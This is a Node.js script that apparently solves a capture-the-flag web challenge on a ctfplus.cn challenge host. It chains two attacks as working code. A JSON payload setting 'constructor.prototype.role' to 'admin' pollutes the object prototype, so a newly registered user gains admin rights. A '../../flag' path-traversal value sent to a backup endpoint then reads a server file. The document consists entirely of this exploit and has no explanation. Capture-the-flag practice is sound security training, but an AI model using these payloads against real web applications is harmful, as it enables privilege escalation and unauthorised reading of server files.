
const http = require('http');
const querystring = require('querystring');

// This finally should work
console.log("Sending request...");

const data = querystring.stringify({
  username: "testflaguser"
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(data)
  }
};

const req = http.request(options, (res) => {
  let body = '';
  res.on('data', (chunk) => body += chunk);
  res.on('end', () => {
    const match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      const uid = match[1];
      console.log("Got UID:", uid);
      // Now login
      doLogin(uid);
    } else {
      console.log("No UID found");
      console.log(body);
    }
  });
});

req.on('error', (e) => {
  console.error(`problem with request: ${e.message}`);
});
req.write(data);
req.end();

function doLogin(uid) {
  const loginData = querystring.stringify({uid: uid});
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(options, (res) => {
    let cookie = res.headers['set-cookie'][0].split(';')[0];
    console.log("Got cookie:", cookie);
    // Now poison
    poisonPrototype(uid, cookie);
  });
  req.on('error', (e) => {
    console.error(`login error: ${e.message}`);
  });
  req.write(loginData);
  req.end();
}

function poisonPrototype(uid, cookie) {
  const poisonData = JSON.stringify({
    uid: uid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(Buffer.from(poisonData)),
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    // Poison done, register new user now!
    console.log("Poison done, register new user...");
    registerAfterPoison();
  });
  req.on('error', (e) => {
    console.error(`poison error: ${e.message}`);
  });
  req.write(poisonData);
  req.end();
}

function registerAfterPoison() {
  const registerData = querystring.stringify({
    username: "finaluserflag"
  });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/register',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(registerData)
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => body += chunk);
    res.on('end', () => {
      const match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (match) {
        const newUid = match[1];
        console.log("New user UID:", newUid);
        console.log("Login new user...");
        loginNewUser(newUid);
      }
    });
  });
  req.on('error', (e) => {
    console.error(`register error: ${e.message}`);
  });
  req.write(registerData);
  req.end();
}

function loginNewUser(newUid) {
  const loginData = querystring.stringify({
    uid: newUid
  });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(options, (res) => {
    let cookie = res.headers['set-cookie'][0].split(';')[0];
    console.log("Got new cookie:", cookie);
    console.log("Requesting flag...");
    requestFlag(cookie);
  });
  req.on('error', (e) => {
    console.error(`new user login error: ${e.message}`);
  });
  req.write(loginData);
  req.end();
}

function requestFlag(cookie) {
  const flagData = querystring.stringify({
    file: '../../flag'
  });
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(flagData),
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => body += chunk);
    res.on('end', () => {
      console.log("\n\n========== FLAG ==========");
      console.log(body);
      console.log("========== END ==========");
    });
  });
  req.on('error', (e) => {
    console.error(`get flag error: ${e.message}`);
  });
  req.write(flagData);
  req.end();
}
